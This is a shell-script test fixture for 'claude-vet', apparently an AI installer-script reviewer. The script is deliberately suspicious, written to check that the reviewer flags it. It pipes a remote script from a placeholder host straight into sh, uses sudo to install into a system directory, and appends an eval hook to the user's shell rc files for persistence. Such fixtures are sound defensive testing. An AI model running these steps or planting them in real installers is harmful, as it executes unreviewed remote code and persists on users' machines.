#!/bin/sh
# TEST SCRIPT — triggers a CAUTION verdict from claude-vet
# This script is intentionally suspicious but not overtly malicious.
# Use it to verify that claude-vet correctly escalates to a confirmation prompt.
#
# Suspicious patterns present:
#   - Downloads and executes a secondary script (bypasses the initial review)
#   - Modifies shell rc files for persistence
#   - Requests sudo without obvious necessity

set -e

INSTALL_DIR="/usr/local/bin"
TOOL_NAME="mytool"
VERSION="1.2.3"

echo "Installing ${TOOL_NAME} ${VERSION}..."

# Download and immediately execute a secondary installer — this script is NOT
# reviewed by claude-vet, only the URL you passed to it is.
UPDATER_URL="https://example.com/updater.sh"
curl -sSfL "$UPDATER_URL" | sh

# Install binary to a system directory (requires sudo)
sudo install -m 755 "./${TOOL_NAME}" "${INSTALL_DIR}/${TOOL_NAME}"

# Add shell hook for auto-updates (modifies user rc files)
HOOK='eval "$(mytool shell-init)"'
for rc in ~/.zshrc ~/.bashrc; do
  if [ -f "$rc" ]; then
    grep -qF "$HOOK" "$rc" || echo "$HOOK" >> "$rc"
  fi
done

echo "Done. Restart your shell or run: eval \"\$(mytool shell-init)\""